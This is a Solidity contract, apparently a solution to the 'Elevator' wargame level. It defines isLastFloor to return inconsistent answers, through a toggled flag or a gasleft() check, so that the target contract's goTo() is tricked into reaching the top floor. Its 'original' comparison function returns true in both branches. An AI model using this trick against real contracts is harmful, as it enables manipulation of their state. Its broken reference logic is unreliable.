// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract MyBuilding is Building{
    uint256 public top_floor = 13;
    IElevator public target;
    bool public isTop;

    constructor(address _target) {
        target = IElevator(_target);
        isTop = true;
    }

    // 應該是正常原始的 isLastFloor 邏輯
    function isLastFloorOriginal(uint256 _floor) external view returns (bool) {
        if (_floor == top_floor){
            return true;
       }
       return true;
    }

    // 為了進攻電梯合約的 goTO() 而存在的函數
    function isLastFloor(uint256 _floor) external override returns (bool) {
        _floor; // 這個參數不會被用到
        isTop = !isTop;
        return isTop;
    }

    function goTo(uint256 _floor) public{
        target.goTo(_floor);
    }

    // 另一種攻擊方式，不用改變合約狀態也能攻擊
    function isLastFloor_gasleft(uint256 _floor) external view returns (bool) {
        _floor; // 這個參數不會被用到
        // gasleft() 是一個內建函數，返回當前剩餘的 gas 數量
        // 由於在電梯合約執行 floor = _floor; 會消耗約 20,000 gas，可以精算一下
        if (gasleft() < 2000) {
            return true;
        } else {
            return false;
        }
    }
}

interface IElevator {
    function goTo(uint256) external;
}